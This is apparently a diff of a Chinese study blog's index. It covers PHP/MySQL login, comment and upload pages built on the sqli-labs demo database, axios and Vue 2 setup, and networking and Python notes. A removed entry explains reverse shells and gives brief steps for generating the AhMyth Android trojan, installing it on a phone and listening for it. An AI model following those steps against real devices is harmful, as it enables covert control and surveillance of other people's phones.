+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091106682.png" alt="image-20231217091106682"></p>
 
-        <h1 id="Wireshark"   >
-          <a href="#Wireshark" class="heading-link"><i class="fas fa-link"></i></a><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1>
-      <p>1.选择要流量监控的网络接口</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193234605.png" alt="image-20231205193234605"></p>
-<p>2.简单介绍部分意思</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193526589.png" alt="image-20231205193526589"></p>
-<p>3.输入过滤条件可以筛选需要监控的流量信息</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193657914.png" alt="image-20231205193657914"></p>
+        <h2 id="PHP-赋值运算符"   >
+          <a href="#PHP-赋值运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-赋值运算符" class="headerlink" title="PHP 赋值运算符"></a>PHP 赋值运算符</h2>
+      <p>x &#x3D; y左操作数被设置为右侧表达式的值</p>
+
+        <h1 id="2-用PHP实现数据交互"   >
+          <a href="#2-用PHP实现数据交互" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用PHP实现数据交互" class="headerlink" title="2.用PHP实现数据交互"></a>2.用PHP实现数据交互</h1>
+      <p>1.打开php study 开启MySQL和apache服务</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091152861.png" alt="image-20231217091152861"></p>
+<p>2.打开网站根目录新建index.php和link.php 文件</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203313873.png" alt="image-20231212203313873"></p>
+<p>3.index.php代码</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203456760.png" alt="image-20231212203456760"></p>
+<p>4.link.php代码</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203528339.png" alt="image-20231212203528339"></p>
+<p>5.新建MySQL连接并新建查询</p>
+<p>打开Navicat Premium <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203801570.png" alt="image-20231212203801570"></p>
+<p>新建数据库</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204749503.png" alt="image-20231212204749503"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204910199.png" alt="image-20231212204910199"></p>
+<p>新建查询</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205001763.png" alt="image-20231212205001763"></p>
+<p>输入以下代码：</p>
+<p>&#x2F;*<br> Navicat Premium Data Transfer</p>
+<p> Source Server         : 1<br> Source Server Type    : MySQL<br> Source Server Version : 50741<br> Source Host           : localhost:3306<br> Source Schema         : security</p>
+<p> Target Server Type    : MySQL<br> Target Server Version : 50741<br> File Encoding         : 65001</p>
+<p> Date: 12&#x2F;12&#x2F;2023 15:44:36<br>*&#x2F;</p>
+<p>SET NAMES utf8mb4;<br>SET FOREIGN_KEY_CHECKS &#x3D; 0;</p>
+<hr>
+<p>– Table structure for emails</p>
+<hr>
+<p>DROP TABLE IF EXISTS <code>emails</code>;<br>CREATE TABLE <code>emails</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>email_id</code> varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 9 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
+<hr>
+<p>– Records of emails</p>
+<hr>
+<p>INSERT INTO <code>emails</code> VALUES (1, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;" >&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (2, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;" >&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (3, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;" >&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (4, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;" >&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (5, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;" >&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (6, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;" >&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (7, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;" >&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (8, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;" >&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);</p>
+<hr>
+<p>– Table structure for referers</p>
+<hr>
+<p>DROP TABLE IF EXISTS <code>referers</code>;<br>CREATE TABLE <code>referers</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>referer</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
+<hr>
+<p>– Table structure for uagents</p>
+<hr>
+<p>DROP TABLE IF EXISTS <code>uagents</code>;<br>CREATE TABLE <code>uagents</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>uagent</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
+<hr>
+<p>– Table structure for users</p>
+<hr>
+<p>DROP TABLE IF EXISTS <code>users</code>;<br>CREATE TABLE <code>users</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>password</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 15 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
+<hr>
+<p>– Records of users</p>
+<hr>
+<p>INSERT INTO <code>users</code> VALUES (1, ‘Dumb’, ‘Dumb’);<br>INSERT INTO <code>users</code> VALUES (2, ‘Angelina’, ‘I-kill-you’);<br>INSERT INTO <code>users</code> VALUES (3, ‘Dummy’, ‘p@ssword’);<br>INSERT INTO <code>users</code> VALUES (4, ‘secure’, ‘crappy’);<br>INSERT INTO <code>users</code> VALUES (5, ‘stupid’, ‘stupidity’);<br>INSERT INTO <code>users</code> VALUES (6, ‘superman’, ‘genious’);<br>INSERT INTO <code>users</code> VALUES (7, ‘batman’, ‘mob!le’);<br>INSERT INTO <code>users</code> VALUES (8, ‘admin’, ‘admin’);<br>INSERT INTO <code>users</code> VALUES (9, ‘admin1’, ‘admin1’);<br>INSERT INTO <code>users</code> VALUES (10, ‘admin2’, ‘admin2’);<br>INSERT INTO <code>users</code> VALUES (11, ‘admin3’, ‘admin3’);<br>INSERT INTO <code>users</code> VALUES (12, ‘dhakkan’, ‘dumbo’);<br>INSERT INTO <code>users</code> VALUES (14, ‘admin4’, ‘admin4’);</p>
+<p>SET FOREIGN_KEY_CHECKS &#x3D; 1;</p>
+<p>并运行</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205054877.png" alt="image-20231212205054877"></p>
+<p>成功会有几个数据表</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205148156.png" alt="image-20231212205148156"></p>
+<p>6.在PHP study打开网站</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205319779.png" alt="image-20231212205319779"></p>
+<p>运行效果，输入表里面有点用户内容会跳转页面并有你输入是用户名，密码</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205455630.png" alt="image-20231212205455630"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205514607.png" alt="image-20231212205514607"></p>
+<p>7.新建一个zhuye.php文件实现主页注销登录功能代码如下</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193715262.png" alt="image-20231213193715262"></p>
+<p>8.重新进行登录成功后进入运行效果如下，点击注销会立马返回登录页面</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193809697.png" alt="image-20231213193809697"></p>
+<p>9.增加实现一个评论区页面功能，新建一个comment.php页面代码如下</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194244959.png" alt="image-20231213194244959"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194308902.png" alt="image-20231213194308902"></p>
+<p>10.进入127.0.0.1&#x2F;comment.php页面成功实现评论功能效果</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194516122.png" alt="image-20231213194516122"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194539713.png" alt="image-20231213194539713"></p>
+<p>11.增加实现一个上传文件功能的页面，新建一个upload.php页面代码如下</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194834994.png" alt="image-20231213194834994"></p>
+<p>12.进入127.0.0.1&#x2F;upload.php页面成功实现上传文件功能效果</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195106958.png" alt="image-20231213195106958"></p>
+<p>13.将评论区功能和上传文件功能都集成给主页，需要给zhuye.php增加代码如下</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195421451.png" alt="image-20231213195421451"></p>
+<p>14.成功给登录成功后主页增加实现评论和上传文件功能</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195701712.png" alt="image-20231213195701712"></p>
 ]]></content>
   </entry>
   <entry>
-    <title>python运算符，数字和字符串</title>
-    <url>/2023/12/04/text7/</url>
+    <title>axios引用,html导入vue2,vue2数据绑定</title>
+    <url>/2023/12/18/text14/</url>
     <content><![CDATA[
-        <h1 id="Python算术运算符"   >
-          <a href="#Python算术运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python算术运算符" class="headerlink" title="Python算术运算符"></a>Python算术运算符</h1>
-      <p>运算符 + ：加 - 两个对象相加</p>
-<p>运算符  - ：减 - 得到负数或是一个数减去另一个数</p>
-<p>运算符 * ：乘 - 两个数相乘或是返回一个被重复若干次的字符串</p>
-<p>运算符 &#x2F; ：除 - x 除以 y</p>
-<p>运算符 % ：取模 - 返回除法的余数</p>
-<p>运算符 **：幂 - 返回x的y次幂</p>
-<p>运算符 &#x2F;&#x2F; ：取整除 - 往小的方向取整数</p>
-<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204204846499.png" alt="image-20231204204846499"></p>
+        <h1 id="Axios-引用"   >
+          <a href="#Axios-引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Axios-引用" class="headerlink" title="Axios 引用"></a>Axios 引用</h1>
+      <p>Axios 是一个基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js。你可以使用 Axios 来发送异步请求，例如从服务器获取数据。</p>
+<p>在 HTML 文件中引入 Axios：</p>
+<!-- 导入 Axios -->
 
-        <h1 id="Python-数字-Number"   >
-          <a href="#Python-数字-Number" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字-Number" class="headerlink" title="Python 数字(Number)"></a>Python 数字(Number)</h1>
-      <ul>
-<li><p><strong>整型(int)</strong> - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。布尔(bool)是整型的子类型。</p>
-</li>
-<li><p><strong>浮点型(float)</strong> - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 &#x3D; 2.5 x 102 &#x3D; 250）</p>
-</li>
-<li><p><strong>复数( (complex))</strong> - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。</p>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
-        <h2 id="Python-数字类型转换"   >
-          <a href="#Python-数字类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字类型转换" class="headerlink" title="Python 数字类型转换"></a>Python 数字类型转换</h2>
-      <p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p>
-<ul>
-<li><strong>int(x)</strong> 将x转换为一个整数。</li>
-<li><strong>float(x)</strong> 将x转换到一个浮点数。</li>
-<li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li>
-<li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li>
-</ul>
-</li>
-</ul>
+<p>可以下载axios文件本地路径引用</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205753451.png" alt="image-20231223205753451"></p>
+<p>然后，你可以在 JavaScript 中使用 Axios 发送请求。以下是一个简单的例子：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205847845.png" alt="image-20231223205847845"></p>
 
-        <h1 id="Python-字符串"   >
-          <a href="#Python-字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-字符串" class="headerlink" title="Python 字符串"></a>Python 字符串</h1>
-      <p>字符串是 Python 中最常用的数据类型。我们可以使用引号( <strong>‘</strong> 或 <strong>“</strong> )来创建字符串。</p>
-<p>Python 访问子字符串，可以使用方括号 <strong>[]</strong> 来截取字符串，字符串的截取的语法格式如下：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></div></figure>
+        <h1 id="HTML-导入-Vue-2"   >
+          <a href="#HTML-导入-Vue-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTML-导入-Vue-2" class="headerlink" title="HTML 导入 Vue 2"></a>HTML 导入 Vue 2</h1>
+      <p>Vue.js 是一套构建用户界面的渐进式框架。下面是如何在 HTML 文件中导入 Vue 2：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!-- 导入 Vue 2 --&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
 
-<p>索引值以 <strong>0</strong> 为开始值，**-1** 为从末尾的开始位置。</p>
-<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204205436471.png" alt="image-20231204205436471"></p>
-<p>Python 的字符串的一些方法：</p>
-<p>1.upper()转换字符串中的小写字母为大写</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204210946961.png" alt="image-20231204210946961"></p>
-<p>2.strip()删除字符串2端的空格或指定字符</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211039648.png" alt="image-20231204211039648"></p>
-<p>3.replace()字符串替换</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211342982.png" alt="image-20231204211342982"></p>
-<p>4.split()对字符串进行切割</p>
-<p>5.join()拼接一个列表的内容成为新的字符串</p>
-<p>6.startswith()判断字符串是否以xxx开头</p>
-<p>7.len()字符串长度内置函数</p>
-<p>8.字符串的循环和遍历<br>for C in S:<br>print(c) 字符串中的每一个字符<br>关于in:<br>1.判断xxx是否在xxxx中出现了<br>2.for循环</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>正反向shell区别和安卓远控工具AhMyth的使用以及部分网络常识</title>
-    <url>/2023/12/04/text6/</url>
-    <content><![CDATA[
-        <h1 id="正反向shell区别"   >
-          <a href="#正反向shell区别" class="heading-link"><i class="fas fa-link"></i></a><a href="#正反向shell区别" class="headerlink" title="正反向shell区别"></a>正反向shell区别</h1>
-      <p>1.反弹shell：</p>
-<p>木马程序运行在被控制端，被控制端主动连接控制端</p>
-<p>2.正向shell：</p>
-<p>控制端主动发起连接去连接被控制端</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191035562.png" alt="image-20231204191035562"></p>
+<p>和axios一样也可以下载到本地进行导用</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210036072.png" alt="image-20231223210036072"></p>
 
-        <h1 id="安卓远控工具AhMyth的使用"   >
-          <a href="#安卓远控工具AhMyth的使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓远控工具AhMyth的使用" class="headerlink" title="安卓远控工具AhMyth的使用"></a>安卓远控工具AhMyth的使用</h1>
-      <p>1.生成木马程序</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191844438.png" alt="image-20231204191844438"></p>
-<p>2.找到木马程序位置</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191952309.png" alt="image-20231204191952309"></p>
-<p>3.将木马程序放入安卓手机或是模拟器当中安装并运行</p>
-<p>4.点击监听按钮并打开运行按钮</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192410210.png" alt="image-20231204192410210"></p>
-<p>5.<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192702390.png" alt="image-20231204192702390"></p>
-
-        <h1 id="部分网络常识"   >
-          <a href="#部分网络常识" class="heading-link"><i class="fas fa-link"></i></a><a href="#部分网络常识" class="headerlink" title="部分网络常识"></a>部分网络常识</h1>
-      <p>1、什么是IP地址<br>IP地址就是给每个连接在Internet上的主机分配的一个32bit地址。按照CP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节,就是4个字节。包括主机地址和网络地址两部分。如11000000 10101000 00000001 00000110(192.168.1.6)</p>
-<p>2、什么是子网掩码<br>子网掩码(subnet masking)的功能是告知主机或路由设备，地址的哪一部分是网络号，包括子网的网络号部分，哪一部分是主机号部分。子网掩码使用与IP地址相同的编址格式，即4个8位组的32位长格式。在子网掩码中，网络部分和子网络部分对应的位全为“1”，主机部分对应的位全为“0”通过将子网掩码与IP地址进行“与”操作,可提供所给定的IP地址所属的网络号(包括子网络号)。<br>3.可用的主机IP地址</p>
-<p>去除网关地址和广播地址中间的部分就是可用的主机IP地址。</p>
-<p>4.七层网络模型</p>
-<ul>
-<li><strong>物理层</strong>：</li>
-</ul>
-<p>解决两个硬件之间怎么通信的问题，常见的物理媒介有光纤、电缆、中继器等。它主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。</p>
-<p>它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换）。这一层的数据叫做比特。</p>
-<ul>
-<li><strong>数据链路层：</strong></li>
-</ul>
-<p>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。该层的主要功能就是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p>
-<p>它的具体工作是接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层。这一层的数据叫做帧。</p>
-<ul>
-<li><strong>网络层：</strong></li>
-</ul>
-<p>计算机网络中如果有多台计算机，怎么找到要发的那台？如果中间有多个节点，怎么选择路径？这就是路由要做的事。</p>
-<p>该层的主要任务就是：通过路由选择算法，为报文（该层的数据单位，由上一层数据打包而来）通过通信子网选择最适当的路径。这一层定义的是IP地址，通过IP地址寻址，所以产生了IP协议。</p>
-<ul>
-<li><strong>传输层：</strong></li>
-</ul>
-<p>当发送大量数据时，很可能会出现丢包的情况，另一台电脑要告诉是否完整接收到全部的包。如果缺了，就告诉丢了哪些包，然后再发一次，直至全部接收为止。</p>
-<p>简单来说，传输层的主要功能就是：监控数据传输服务的质量，保证报文的正确传输。</p>
-<ul>
-<li><strong>会话层：</strong></li>
-</ul>
-<p>虽然已经可以实现给正确的计算机，发送正确的封装过后的信息了。但我们总不可能每次都要调用传输层协议去打包，然后再调用IP协议去找路由，所以我们要建立一个自动收发包，自动寻址的功能。于是会话层出现了：它的作用就是建立和管理应用程序之间的通信。</p>
-<ul>
-<li><strong>表示层：</strong></li>
-</ul>
-<p>表示层负责数据格式的转换，将应用处理的信息转换为适合网络传输的格式，或者将来自下一层的数据转换为上层能处理的格式。</p>
-<ul>
-<li><strong>应用层：</strong></li>
-</ul>
-<p>应用层是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。前端同学对应用层肯定是最熟悉的。</p>
-<p>5.常见协议端口号</p>
+        <h1 id="Vue-2-数据绑定使用教程"   >
+          <a href="#Vue-2-数据绑定使用教程" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vue-2-数据绑定使用教程" class="headerlink" title="Vue 2 数据绑定使用教程"></a>Vue 2 数据绑定使用教程</h1>
+      <p>Vue 2 提供了强大的数据绑定机制，以下是一个简单的使用实例：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210450633.png" alt="image-20231223210450633"></p>
 <ol>
-<li><strong>HTTP (Hypertext Transfer Protocol)</strong><ul>
-<li>默认端口：80</li>
-<li>描述：用于在Web浏览器和Web服务器之间传输超文本的协议。</li>
-</ul>
-</li>
-<li><strong>HTTPS (Hypertext Transfer Protocol Secure)</strong><ul>
-<li>默认端口：443</li>
-<li>描述：与HTTP类似，但通过TLS&#x2F;SSL加密传输数据，用于安全的Web通信。</li>
-</ul>
-</li>
-<li><strong>FTP (File Transfer Protocol)</strong><ul>
-<li>默认端口：21</li>
-<li>描述：用于在网络上传输文件的标准协议。</li>
-</ul>
-</li>
-<li><strong>SSH (Secure Shell)</strong><ul>
-<li>默认端口：22</li>
-<li>描述：用于通过加密的方式在网络上安全地访问和管理远程计算机。</li>
-</ul>
-</li>
-<li><strong>SMTP (Simple Mail Transfer Protocol)</strong><ul>
-<li>默认端口：25</li>
-<li>描述：用于在网络上传输电子邮件的协议。</li>
-</ul>
-</li>
-<li><strong>POP3 (Post Office Protocol version 3)</strong><ul>
-<li>默认端口：110</li>
-<li>描述：用于从邮件服务器接收电子邮件的协议。</li>
-</ul>
-</li>
-<li><strong>IMAP (Internet Message Access Protocol)</strong><ul>
-<li>默认端口：143</li>
-<li>描述：允许邮件客户端从邮件服务器获取电子邮件的协议。</li>
-</ul>
-</li>
-<li><strong>DNS (Domain Name System)</strong><ul>
-<li>默认端口：53</li>
-<li>描述：将域名转换为IP地址，实现域名解析的协议。</li>
-</ul>
-</li>
-<li><strong>DHCP (Dynamic Host Configuration Protocol)</strong><ul>
-<li>默认端口：67和68</li>
-<li>描述：用于自动分配IP地址和其他网络配置信息给计算机的协议。</li>
-</ul>
-</li>
-<li><strong>SNMP (Simple Network Management Protocol)</strong><ul>
-<li>默认端口：161和162</li>
-<li>描述：用于网络设备之间的管理和监控。</li>
-</ul>
-</li>
-<li><strong>RDP (Remote Desktop Protocol)</strong><ul>
-<li>默认端口：3389</li>
-<li>描述：用于在远程计算机之间进行图形化桌面会话。</li>
-</ul>
-</li>
-<li><strong>NTP (Network Time Protocol)</strong><ul>
-<li>默认端口：123</li>
-<li>描述：用于同步计算机时钟的协议。</li>
+<li><strong>el: ‘#app’：</strong> 这里指定了 Vue 实例的挂载点，也就是 HTML 中的 <code>id=&quot;app&quot;</code> 的元素。Vue 将会控制这个元素内部的内容。</li>
+<li><strong>data: function()：</strong> 在 <code>data</code> 中定义了 Vue 实例的数据。<code>visible</code> 控制一个元素或组件的可见性，而 <code>userData</code> 是一个包含用户信息的对象，包括 <code>username</code> 和 <code>password</code>。</li>
+<li><strong>methods：</strong> 这里定义了一些方法，其中包括：<ul>
+<li><strong>login：</strong> 处理用户登录的方法。使用 Axios 发送 POST 请求到 <code>http://127.0.0.1/api1.php</code>，将 <code>this.userData</code>（包含用户输入的用户名和密码）作为请求体发送。然后，根据响应判断是否登录成功，如果成功，重定向到 <code>http://127.0.0.1/index.php</code>，否则调用 <code>open4</code> 方法弹出错误通知。</li>
+<li><strong>open4：</strong> 使用 Element UI 的 <code>$notify</code> 方法弹出一个错误通知，显示错误的标题和消息。</li>
 </ul>
 </li>
 </ol>
+<p>整个 Vue 实例的作用是监听用户的输入，通过 Axios 发送登录请求，并根据返回结果执行相应的操作。这是一个简单的用户登录页面的前端逻辑。注意，这里的实例中使用了 Element UI 的通知组件，确保你已经导入 Element UI 的相关库和样式。</p>
 ]]></content>
   </entry>
   <entry>
-    <title>python安装与基础语法</title>
-    <url>/2023/12/03/text5/</url>
+    <title>Python文件操作</title>
+    <url>/2023/12/18/text18/</url>
     <content><![CDATA[
-        <h1 id="1-python安装"   >
-          <a href="#1-python安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-python安装" class="headerlink" title="1.python安装"></a>1.python安装</h1>
-      <p>来到<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=Python%E5%AE%98%E7%BD%91&spm=1001.2101.3001.7020" >Python官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：<span class="exturl"><a class="exturl__link"   href="https://www.python.org/" >https://www.python.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>Downloads&gt;Windows：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161517785.png" alt="image-20231203161517785"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161653328.png" alt="image-20231203161653328"></p>
